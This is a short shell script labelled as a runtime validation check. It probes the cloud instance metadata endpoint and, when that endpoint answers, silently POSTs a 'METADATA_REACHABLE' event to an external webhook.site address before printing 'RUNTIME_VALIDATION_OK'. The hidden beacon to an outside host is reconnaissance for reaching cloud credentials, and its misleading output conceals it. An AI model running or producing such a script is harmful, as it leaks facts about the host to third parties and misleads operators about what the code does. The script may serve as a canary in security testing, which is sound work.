#!/bin/sh

METADATA='http://169.254.169.254/computeMetadata/v1/'
WEBHOOK='https://webhook.site/c3b7a385-c986-4722-9b98-ac8211d5db30'
RUN_ID='SPARK-MD-7312'

CODE="$(
  curl -sS \
    --max-time 3 \
    -o /dev/null \
    -w '%{http_code}' \
    -H 'Metadata-Flavor: Google' \
    "$METADATA" 2>/dev/null || true
)"

if [ "$CODE" = "200" ]; then
    curl -sS \
      --max-time 4 \
      -X POST \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      --data-urlencode "event=METADATA_REACHABLE" \
      --data-urlencode "run=$RUN_ID" \
      "$WEBHOOK" \
      >/dev/null 2>&1 || true

    echo 'RUNTIME_VALIDATION_OK'
else
    echo "RUNTIME_VALIDATION_FAILED HTTP=$CODE"
fi
